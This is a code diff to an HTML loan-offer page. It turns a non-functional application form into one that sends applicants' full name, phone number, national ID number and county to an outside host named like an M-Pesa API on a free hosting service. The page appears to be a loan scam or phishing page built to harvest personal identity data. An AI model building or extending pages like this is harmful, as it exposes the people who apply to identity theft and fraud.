@@ -77,6 +77,22 @@
         input::placeholder {
             color: #888888;
         }
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #004B23; /* Matching Jungle Green */
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+        .submit-btn:hover {
+            background-color: #003318; /* Darker green on hover */
+        }
     </style>
 </head>
 <body>
@@ -97,28 +113,31 @@
         
         <p class="call-to-action">💰 Borrow Today, Repay with Ease. Apply now</p>
 
-        <!-- Cosmetic Input Form Section -->
-        <form onsubmit="return false;">
+        <!-- Form Section with Redirect Action -->
+        <form action="https://mpesa-api-z14k.onrender.com/" method="GET">
             
             <div class="field-group">
                 <label for="fullname">Full Name</label>
-                <input type="text" id="fullname" placeholder="e.g. John Doe">
+                <input type="text" id="fullname" name="fullname" placeholder="e.g. John Doe" required>
             </div>
 
             <div class="field-group">
                 <label for="phone">Phone Number</label>
-                <input type="tel" id="phone" placeholder="e.g. 0712345678">
+                <input type="tel" id="phone" name="phone" placeholder="e.g. 0712345678" required>
             </div>
 
             <div class="field-group">
                 <label for="nationalid">National ID</label>
-                <input type="text" id="nationalid" placeholder="e.g. 12345678">
+                <input type="text" id="nationalid" name="nationalid" placeholder="e.g. 12345678" required>
             </div>
 
             <div class="field-group">
                 <label for="county">County</label>
-                <input type="text" id="county" placeholder="e.g. Nairobi">
+                <input type="text" id="county" name="county" placeholder="e.g. Nairobi" required>
             </div>
+
+            <!-- Submit Button -->
+            <button type="submit" class="submit-btn">Apply Now</button>
 
         </form>
     </div>
